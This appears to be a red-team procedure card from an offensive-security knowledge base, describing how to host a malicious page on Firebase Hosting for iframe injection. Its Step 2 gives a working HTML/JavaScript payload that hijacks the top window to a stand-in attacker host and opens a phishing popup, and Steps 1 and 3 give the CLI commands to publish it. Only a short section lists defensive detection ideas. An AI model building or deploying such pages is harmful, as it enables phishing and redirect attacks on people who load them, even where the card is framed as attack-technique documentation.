---
id: proc-firebase-deploy-malicious
tags:
  - hosting
  - malicious-payload
  - javascript
type: procedure
tools:
  - '[[tools/Node.js]]'
  - '[[tools/Firebase-Hosting]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.498Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
---
# Deploy-Malicious-Page-on-Firebase-Hosting

## Summary

This procedure deploys a static HTML page containing malicious JavaScript to Firebase Hosting, creating a free endpoint for iframe sourcing that triggers redirects and popups when loaded.

## Description

Firebase Hosting's free tier allows quick deployment of static sites, which can host JavaScript payloads exploitable via CSP-bypassing iframes. The page includes code to alert, redirect the top window, and open phishing popups. This targets public web environments and requires a Firebase project setup; outcomes include a live URL like *.firebaseapp.com for injection.

## Requirements

1. Node.js installed (v14+ recommended)
2. Firebase CLI installed and authenticated
3. Firebase project created via console
4. Basic HTML/JavaScript knowledge

## Defense

Defensive measures and detection strategies:

- Scan public hosting uploads for malicious JS patterns (e.g., window.open, top.location)
- Implement rate limiting on deployments to free tiers
- Monitor Firebase logs for suspicious static site content

## Objectives

1. Host executable JavaScript on a free, wildcard-allowed domain
2. Ensure payload compatibility with iframe contexts
3. Validate deployment without errors

## Instructions

### Step 1: Initialize Firebase Project Locally

**Context**: Set up the local directory for hosting using Node.js and Firebase tools.

Install Firebase CLI if needed: `npm install -g firebase-tools`, then `firebase login` and `firebase init hosting` in a new directory.

> Expected: Project initializes with public/ folder for static files.

### Step 2: Create Malicious HTML Payload

**Context**: Write index.html with JS for exploitation.

Create public/index.html:

```html
<!DOCTYPE html>
<html>
<body>
<script>
alert(123);
top.location='https://www.attacker.com';
window.open('https://phish-site.com', '_blank');
</script>
</body>
</html>
```

> Expected: File saved; test locally by opening in browser.

### Step 3: Deploy to Firebase

**Context**: Push the site live using Firebase CLI.

Run `firebase deploy --only hosting`.

> Expected: Deployment succeeds; URL provided (e.g., https://hackerone-jm.firebaseapp.com).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Node.js]]
- [[tools/Firebase-Hosting]]

## Tags

- hosting
- malicious-payload
- javascript
